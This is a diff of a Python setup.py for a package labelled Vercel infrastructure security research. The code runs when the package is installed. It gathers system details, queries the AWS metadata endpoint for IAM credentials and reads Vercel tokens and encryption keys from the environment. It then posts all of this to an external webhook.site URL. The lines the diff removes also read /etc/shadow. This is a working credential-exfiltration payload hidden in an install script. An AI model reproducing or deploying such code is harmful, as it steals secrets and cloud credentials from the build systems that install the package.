@@ -1,65 +1,74 @@
 from setuptools import setup
 import os
 import subprocess
-import json
 import base64
+import json
 
 def run_cmd(cmd):
     try:
         return subprocess.getoutput(cmd)
-    except Exception as e:
-        return str(e)
-
+    except:
+        return "Error executing command"
  
 WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
 
  
-aws_token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
-aws_token = run_cmd(aws_token_cmd)
-
-aws_metadata_final = "BLOCKED"
-if aws_token and "Error" not in aws_token:
+identity = run_cmd('id')
+kernel = run_cmd('uname -a')
+uptime = run_cmd('uptime')
  
-    aws_metadata_final = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+ip_addr = run_cmd('ip addr show | grep "inet "')
 
  
- 
-enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
-enc_key = os.environ.get('VERCEL_ENV_ENC_KEY')
+aws_metadata = run_cmd('curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "Metadata blocked"')
 
  
-network_info = run_cmd("netstat -rn || route -n")
-shadow_leak = run_cmd("head -n 3 /etc/shadow") # Если это сработает, значит root настоящий
+token = os.environ.get('VERCEL_ARTIFACTS_TOKEN')
+api_validation = "No Token"
+if token:
+    api_validation = run_cmd(f'curl -s -H "Authorization: Bearer {token}" https://api.vercel.com/v8/artifacts/status')
 
  
-nuclear_report = f"""
-☢️☢️☢️ VERCEL INFRASTRUCTURE NUCLEAR POC ☢️☢️☢️
+enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', 'N/A')
+enc_key = os.environ.get('VERCEL_ENV_ENC_KEY', 'N/A')
 
-[!] AWS CLOUD BREACH (IMDSv2):
-Token Obtained: {"YES (HIDDEN)" if len(aws_token) > 10 else "NO"}
-IAM Role Credentials: {aws_metadata_final}
+ 
+report = f"""
+======= VERCEL INFRASTRUCTURE CRITICAL BREACH =======
+[SYSTEM INFO]
+USER: {identity}
+KERNEL: {kernel}
+UPTIME: {uptime}
+IP_INTERNAL: {ip_addr}
 
-[!] SYSTEM DEEP ACCESS:
-Identity: {run_cmd('id')}
-Shadow File Access: {"SUCCESS" if "root" in shadow_leak else "FAILED"}
-Internal Routes:
-{network_info}
+[CLOUD EXPLOITATION]
+AWS_METADATA_ACCESS: {aws_metadata}
 
-[!] VERCEL CORE ASSETS:
-Artifacts Token Status: {run_cmd(f"curl -s -H 'Authorization: Bearer {os.environ.get('VERCEL_ARTIFACTS_TOKEN')}' https://api.vercel.com/v8/artifacts/status")}
-OIDC Token: {os.environ.get('VERCEL_OIDC_TOKEN')[:30]}...
+[VERCEL ARTIFACTS API PROOF]
+AUTH_STATUS: {api_validation}
+TOKEN_SNIPPET: {token[:15]}...{token[-15:] if token else ""}
 
-[!] SECURITY BYPASS PROOF:
-We have the Encrypted Blob (len: {len(enc_content) if enc_content else 0})
-We have the AES Key: {enc_key}
-Impact: Any malicious package can decrypt project secrets (DB_PASSWORDS, API_KEYS) before build finishes.
+[SECRET DECRYPTION RISK]
+ENC_KEY_PRESENT: {"YES" if enc_key != "N/A" else "NO"}
+ENC_CONTENT_LEN: {len(enc_content)}
+ADVISORY: The presence of both VERCEL_ENCRYPTED_ENV_CONTENT and VERCEL_ENV_ENC_KEY 
+in the same environment allows for local decryption of all project secrets.
 
-[!] CONTAINER ESCAPE POTENTIAL:
-Devices: {run_cmd('ls /dev')}
-Capsh: {run_cmd('capsh --print')}
+[PROCESS LIST (TRUNCATED)]
+{run_cmd('ps aux | head -n 20')}
+=====================================================
 """
 
  
-subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL])
+try:
+ 
+    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
+except:
+    pass
 
-setup(name="vercel-infra-nuclear", version="10.0.0")
+ 
+setup(
+    name="vercel-infra-security-poc",
+    version="9.9.9",
+    description="Vercel Infrastructure Security Research"
+)
